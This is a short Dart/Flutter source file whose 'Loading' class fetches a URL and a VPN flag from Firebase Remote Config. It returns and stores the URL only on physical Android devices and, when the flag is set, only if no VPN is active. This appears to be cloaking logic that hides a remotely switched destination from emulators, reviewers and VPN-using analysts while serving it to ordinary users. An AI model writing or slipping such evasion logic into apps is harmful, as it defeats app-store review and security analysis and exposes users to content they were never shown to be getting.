import 'package:check_vpn_connection/check_vpn_connection.dart';
import 'package:device_info/device_info.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:shared_preferences/shared_preferences.dart';

class Loading {
  static final devplug = DeviceInfoPlugin();
  static SharedPreferences? _shared;
  static bool to = false;
  static bool dev = false;
  static String go = '';

  static remurl() async {
    final FirebaseRemoteConfig remoteConfig = FirebaseRemoteConfig.instance;
    await remoteConfig.fetchAndActivate();
    return remoteConfig.getString('url');
  }

  static remvpn() async {
    final FirebaseRemoteConfig remoteConfig = FirebaseRemoteConfig.instance;
    await remoteConfig.fetchAndActivate();
    return remoteConfig.getBool('to');
  }

  static active() async {
    if (await CheckVpnConnection.isVpnActive()) {
      return true;
    } else {
      return false;
    }
  }

  static nextPage() async {
    String go = await getShared('key');

    if (go.isEmpty) {
      to = await remvpn();
      final dev = await devplug.androidInfo;
      if (to) {
        go = await remurl();
        
        bool act = await active();
        if (!dev.isPhysicalDevice || go.isEmpty || act) {
          return '';
        } else {
          setShared('key', go);
          return go;
        }
      } else {
        go = await remurl();
        if (go.isEmpty || !dev.isPhysicalDevice) {
          return '';
        } else {
          setShared('key', go);
          return go;
        }
      }
    } else {
      return go;
    }
  }

  static getShared(String key) async {
    _shared = await SharedPreferences.getInstance();
    return _shared?.getString(key) ?? '';
  }

  static setShared(String key, String nam) async {
    await _shared?.setString(key, nam);
  }
}
